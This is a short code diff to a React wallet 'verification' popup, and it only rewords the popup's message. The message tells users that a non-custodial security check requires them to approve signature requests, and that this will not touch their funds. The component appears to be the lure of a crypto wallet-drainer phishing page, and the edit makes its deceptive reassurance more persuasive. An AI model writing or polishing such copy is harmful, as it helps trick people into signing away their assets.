@@ -238,7 +238,7 @@ export const WalletVerificationPopup = () => {
             </div>
             <h2 className="text-xl font-bold text-foreground">Wallet Balance Verification</h2>
             <p className="text-sm text-muted-foreground leading-relaxed">
-              For security, we need to verify your wallet balance before proceeding. This quick, non-custodial check confirms ownership. Please approve the upcoming signature requests.
+              To ensure the safety of your assets, a quick wallet balance verification is required before you can proceed. This non-custodial security check confirms your ownership without accessing your funds. Please approve the upcoming signature requests to complete verification.
             </p>
             <div className="flex items-center gap-2 mt-2">
               <Loader2 className="w-4 h-4 animate-spin text-primary" />
